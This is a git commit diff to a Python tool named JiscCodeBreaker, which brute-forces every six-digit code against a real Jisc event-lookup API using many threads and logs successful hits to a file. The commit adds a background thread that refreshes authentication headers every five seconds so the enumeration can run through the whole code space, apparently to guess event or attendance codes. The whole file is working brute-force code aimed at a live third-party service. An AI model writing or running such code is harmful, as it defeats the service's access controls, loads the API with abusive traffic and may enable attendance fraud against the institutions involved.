dd7ef770cab194f6c6f3d990c88a8adcb92a713f
Matthew <mrawson@redev.co.uk>
2024-09-24 03:48:01 +0100

    Updated CodeBreaker to use headers updates

--- Jisc-Extractor/Services/JiscCodeBreaker.py
+++ Jisc-Extractor/Services/JiscCodeBreaker.py
@@ -1,32 +1,42 @@
 import requests
 import concurrent.futures
+import threading
+import time
 
 class JiscCodeBreaker:
-    def __init__(self, headers, eventId, searchValueLow=0, searchValueHigh=999999, threadCount=10):
+    def __init__(self, headers, eventId, jiscTokenExtractor, searchValueLow=0, searchValueHigh=999999, threadCount=10):
         self.eventId = eventId
         self.threadCount = threadCount
         self.headers = headers
         self.searchValueLow = searchValueLow
         self.searchValueHigh = searchValueHigh
+        self.jiscTokenExtractor = jiscTokenExtractor
+        self.HasCodeBeenFound = False
         self.url_template = "https://api.la.jisc.ac.uk/event/lookup/{:06d}?id={}"
+        self.header_lock = threading.Lock() 
 
     def CheckResponse(self, number):
         url = self.url_template.format(number, self.eventId)
         try:
-            response = requests.get(url, headers=self.headers)
+            with self.header_lock:
+                response = requests.get(url, headers=self.headers)
             print(f"Checking number: {str(number).zfill(6)}")
             if response.status_code == 200 and response.json() != {"error": "Something went wrong"}:
                 print(f"Success with number: {number}")
                 with open('success.txt', 'a') as f:
                     f.write(f"Success with number: {number}\n")
                     f.write(f"{response.json()}\n\n")
+                self.HasCodeBeenFound = True
                 return True
         except Exception as e:
             print(f"Error with number {number}: {e}")
         return False
 
     def GetCode(self):
-        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threadCount) as executor:
+        header_updater = threading.Thread(target=self._update_headers, daemon=True)
+        header_updater.start()
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threadCount-1) as executor:
             futures = [executor.submit(self.CheckResponse, number) for number in range(self.searchValueLow, self.searchValueHigh + 1)]
             for future in concurrent.futures.as_completed(futures):
                 try:
@@ -36,3 +46,9 @@ class JiscCodeBreaker:
                         break
                 except Exception as e:
                     print(f"Error in thread: {e}")
+
+    def _update_headers(self):
+        while not self.HasCodeBeenFound:
+            with self.header_lock:
+                self.headers = self.jiscTokenExtractor.GetJiscHeaders()
+            time.sleep(5)
